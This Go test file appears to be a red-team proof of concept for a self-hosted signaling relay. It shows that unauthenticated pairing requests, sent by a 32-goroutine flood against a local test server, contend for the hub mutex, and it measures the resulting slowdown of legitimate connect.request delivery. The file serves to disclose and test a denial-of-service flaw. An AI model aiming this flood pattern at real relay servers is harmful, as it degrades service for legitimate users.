// Red-team PoC: unauthenticated pairing/activity handlers starve the hub mutex.
//
// internal/signal/socket.go:117-123 dispatches ?activity / ?pairing (GET with
// query) / POST to servePairing/serveActivity BEFORE the token gate
// (socket.go:131-135) and BEFORE acquirePreAuth (socket.go:136-141): these
// paths have no arrival budget of any kind. Each takes h.mu — the SAME mutex
// that serializes every routed WS message (hub.handle, hub.go:254).
//
// An unauthenticated remote attacker (no token, no pairing knowledge) can
// therefore keep the hub mutex hot and inflate the latency of every
// legitimate signaling operation. This test demonstrates it dynamically:
// a real paired flow (connect.request push delivery to the desktop, the
// operation a guest needs before any remote control can start) is measured
// alone, then under a 32-goroutine garbage pairing flood (every request
// answered 404 — never 429/503).
//
// Run:  VANORA_SECURITY_STRICT=1 go test ./red_poc -run TestRedUnauthHubMutexStarvation -v
package red_poc

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/coder/websocket"

	"vanora-relay/internal/ice"
	"vanora-relay/internal/signal"
	"vanora-relay/protocol"
)

func TestRedUnauthHubMutexStarvation(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	token := strings.Repeat("K", 40)
	t.Setenv("STUN_URLS", "local")
	t.Setenv("TURN_PUBLIC_IP", "127.0.0.1")
	t.Setenv("TURN_BIND_IP", "127.0.0.1")
	t.Setenv("TURN_PORT", "0")
	t.Setenv("TURN_TCP", "false")
	t.Setenv("TURN_RELAY_MIN_PORT", "0")
	t.Setenv("TURN_RELAY_MAX_PORT", "0")
	_ = os.Getenv("VANORA_SECURITY_STRICT")
	iceSrv, err := ice.FromEnv()
	mustOK(t, err)
	t.Cleanup(func() { _ = iceSrv.Close() })

	h := signal.NewSelfHosted(token, iceSrv)
	go h.Run(ctx)
	srv := httptest.NewServer(h)
	defer srv.Close()
	wsURL := "ws" + strings.TrimPrefix(srv.URL, "http")

	// Legitimate parties: victim desktop + a paired guest phone.
	desk := dialSelf(t, ctx, wsURL, token, "desktop")
	card := protocol.Message{Type: "device.card", From: desk.id, To: "self"}
	mustOK(t, card.Sign(desk.priv, []byte("VictimPC")))
	desk.send(t, protocol.Message{Type: "device.online", Data: protocol.Encode(map[string]any{"card": card})})
	desk.readExpect(t, "device.registered")
	mob := dialSelf(t, ctx, wsURL, token, "mobile")

	// Desk-side push reader: delivers inbound hub pushes.
	type push struct {
		msg protocol.Message
		at  time.Time
	}
	pushes := make(chan push, 512)
	go func() {
		for {
			_, raw, err := desk.ws.Read(ctx)
			if err != nil {
				close(pushes)
				return
			}
			var m protocol.Message
			if json.Unmarshal(raw, &m) == nil {
				pushes <- push{msg: m, at: time.Now()}
			}
		}
	}()

	var seq uint64 = 1
	// pairedRoundTrip: guest sends a fresh connect.request (VR-SEC-09-style
	// legit flow), we time until the hub push lands on the desktop, then
	// close the link. Every message crosses hub.handle under h.mu.
	pairedRoundTrip := func() time.Duration {
		cid := protocol.NewID()
		req := protocol.Message{Type: "connect.request", Connection: cid, From: mob.id, To: desk.id, Seq: seq}
		seq++
		mustOK(t, req.Sign(mob.priv, []byte(`{"name":"Probe"}`)))
		sent := time.Now()
		mustOK(t, mob.ws.Write(mob.ctx, websocket.MessageText, protocol.Encode(req)))

		deadline := time.After(10 * time.Second)
		for {
			select {
			case <-deadline:
				t.Fatal("hub push never reached desktop")
			case p, ok := <-pushes:
				if !ok {
					t.Fatal("desktop socket closed")
				}
				if p.msg.Type == "connect.request" && p.msg.Connection == cid {
				lat := p.at.Sub(sent)
					cls := protocol.Message{Type: "connect.close", Connection: cid, From: mob.id, To: desk.id, Seq: seq}
					seq++
					mustOK(t, cls.Sign(mob.priv, nil))
					mustOK(t, mob.ws.Write(mob.ctx, websocket.MessageText, protocol.Encode(cls)))
					return lat
				}
				// other pushes (connect.closed etc.) are drained.
			}
		}
	}

	measure := func(n int) time.Duration {
		lat := make([]time.Duration, 0, n)
		for range n {
			lat = append(lat, pairedRoundTrip())
			// Stay under the hub's 120 msgs/s peer budget (VR-SEC-09 pattern).
			time.Sleep(20 * time.Millisecond)
		}
		for i := 1; i < len(lat); i++ {
			for j := i; j > 0 && lat[j] < lat[j-1]; j-- {
				lat[j], lat[j-1] = lat[j-1], lat[j]
			}
		}
		return lat[len(lat)/2]
	}

	baseline := measure(100)

	// Unauthenticated flood: 32 goroutines spamming GET ?pairing=<garbage>.
	// Zero credentials, zero pairing knowledge. Every request: h.mu.Lock +
	// map miss + unlock + 404. Never 429/503 (no budget on this path).
	floodCtx, floodStop := context.WithCancel(ctx)
	var flooded, flooded404 int64
	var wg sync.WaitGroup
	floodURL := srv.URL + "/v1/signal?pairing=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	client := &http.Client{Timeout: 5 * time.Second}
	for range 32 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for floodCtx.Err() == nil {
				resp, err := client.Get(floodURL)
				if err != nil {
					continue
				}
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				atomic.AddInt64(&flooded, 1)
				if resp.StatusCode == http.StatusNotFound {
					atomic.AddInt64(&flooded404, 1)
				}
			}
		}()
	}
	time.Sleep(300 * time.Millisecond) // let the flood ramp up
	underFlood := measure(100)
	floodStop()
	wg.Wait()

	if flooded < 1000 {
		t.Fatalf("flood too weak to be representative: %d requests", flooded)
	}
	if flooded != flooded404 {
		t.Fatalf("flood was throttled? total=%d 404s=%d — expected zero throttling", flooded, flooded404)
	}

	floor := baseline
	if floor < time.Microsecond {
		floor = time.Microsecond
	}
	factor := float64(underFlood) / float64(floor)
	t.Fatalf("RED TEAM WIN (unauth hub-mutex starvation): p50 connect.request push delivery "+
		"%.1fus -> %.1fus (x%.0f) under %d unauthenticated pairing flood reqs from 32 goroutines, "+
		"zero 429/503 ever issued; no token / no pairing knowledge used.",
		float64(baseline.Nanoseconds())/1000, float64(underFlood.Nanoseconds())/1000,
		factor, flooded)
}
